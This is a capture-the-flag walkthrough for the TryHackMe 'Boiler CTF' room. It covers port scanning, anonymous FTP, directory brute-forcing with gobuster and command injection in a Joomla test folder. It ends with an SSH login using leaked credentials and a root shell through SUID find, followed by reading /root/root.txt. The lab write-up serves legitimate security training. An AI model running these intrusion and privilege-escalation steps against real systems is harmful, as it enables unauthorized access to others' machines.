# [Boiler CTF](https://tryhackme.com/room/boilerctf2)

## Intermediate level CTF

# Questions #1

## Intermediate level CTF. Just enumerate, you'll get there.

### File extension after anon login

1. Enumerate ports with nmap

```Bash
nmap -p- -sV <IP>
```

[SCREEN01]

2. There is an ftp port on which we can log in anonymously

```Bash
ftp <IP>
anonymous
cd /
ls -la
get .info.txt
```

[SCREEN03]

3. The file is encoded with ROT13, and contains very important information ;)

### What is on the highest port?

### What's running on port 10000?

1. After enumerating the ports we know that on highest port there is `ssh`, and there is webmin running on the port 10000

[SCREEN01]

### What CMS can you access?

1. After running gobuster, we find out about `/joomla` endpoint

```Bash
gobuster dir -u http://<IP>:80 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

[SCREEN02]

### The interesting file name in the folder?

1. Let's go deeper into Joomla

```Bash
gobuster dir -u http://<IP>:80/joomla/ -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

[SCREEN04]

2. The `/administrator` and `/_files` are the most interesting ones. I decided to search for more directories with `_` prefix. This way I stumbled upon `/_test` directory

```Bash
sed 's/^/_/' /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt > underscore-wordlist.txt
```

```Bash
gobuster dir -u http://<IP>/joomla/ -w underscore-wordlist.txt
```

[SCREEN05]

3. If we try command injection we can get a list of files

[SCREEN06]

# Questions #2

## You can complete this with manual enumeration, but do it as you wish

### Where was the other users pass stored?

1. In `log.txt`, we can find credentials to log in using ssh

[SCREEN07]

```Bash
ssh basterd@<IP> -p 55007
python -c 'import pty; pty.spawn("/bin/bash")'
ls
cat backup.sh
```

[SCREEN08]

### user.txt

1. Switch to our newly acquired user

```Bash
su stoner
ls -la
cat .secret
```

[SCREEN09]

### What did you exploit to get the privileged user?

1. `sudo -l` doesn't give us anything useful so let's search for SUID binaries

```Bash
find / -perm -u=s -type f 2>/dev/null
```

[SCREEN10]

2. Go to the [GTFOBins](https://gtfobins.github.io/gtfobins/find/) and search for the `find` command

```Bash
/usr/bin/find . -exec /bin/sh -p \; -quit
cat /root/root.txt
```

[SCREEN11]
